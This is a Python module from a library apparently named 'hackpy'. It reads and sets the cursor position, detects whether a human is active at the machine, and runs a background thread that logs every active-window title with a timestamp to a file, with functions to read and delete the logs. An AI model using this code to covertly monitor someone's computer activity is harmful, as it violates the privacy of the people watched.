from os          import remove, path
from threading   import Thread
from hackpy.time     import *
from hackpy.settings import *
from hackpy.commands import *
from hackpy.modules  import *

# Get cursor position
def getCursorPos():
	require_module('activity.exe')
	cursorPos = command.system(modules_path + 'activity.exe getCursorPosition').split()
	return int(cursorPos[0]), int(cursorPos[1])

# Set cursor position
def setCursorPos(x, y):
	require_module('activity.exe')
	command.system(modules_path + 'activity.exe setCursorPosition ' + str(x) + ' ' + str(y))

# Get active window
def getActiveWindow():
	require_module('activity.exe')
	window = command.system(modules_path + 'activity.exe getActiveWindow')
	return window.encode('866').decode()

# Check if human use computer
def userIsActive(wait = 2):
	require_module('activity.exe')
	first_x, first_y = getCursorPos()
	sleep(wait)
	last_x, last_y   = getCursorPos()
	if first_x != last_x or first_y != last_y:
		return True
	else:
		return False


# ProgramActivityLogger module
class ProgramActivitylogger:
	def __init__(self, filename = 'programlogs.txt'):
		self.filename = filename

	def startHackpyProgramActivityLogger(self):
		global hackpyProgramActivityLoggerIsStopped
		hackpyProgramActivityLoggerIsStopped = False
		old_data = ''
		while not hackpyProgramActivityLoggerIsStopped:
			new_data = getActiveWindow()
			if new_data != old_data:
				with open(self.filename, 'a', encoding = "utf8", errors = 'ignore') as logs:
					logs.write('(' + date.all() + ') - \"' + new_data + '\"\n')
				old_data = new_data
			sleep(1.5)

	# Start Activitylogger
	def start(self):
		s = Thread(target=self.startHackpyProgramActivityLogger)
		s.start()

	# Stop Activitylogger
	def stop(self):
		global hackpyProgramActivityLoggerIsStopped
		hackpyProgramActivityLoggerIsStopped = True

	# Get logs
	def getLogs(self):
		if path.exists(self.filename):
			logs_lines = []
			with open(self.filename, 'r', encoding = "utf8", errors = 'ignore') as logs_file:
				lines = logs_file.readlines()
			for line in lines:
				line = line.replace('\n', '')
				logs_lines.append(line)
			return logs_lines
		else:
			return False

	# Delete logs file
	def cleanLogs(self):
		try:
			remove(self.filename)
		except:
			pass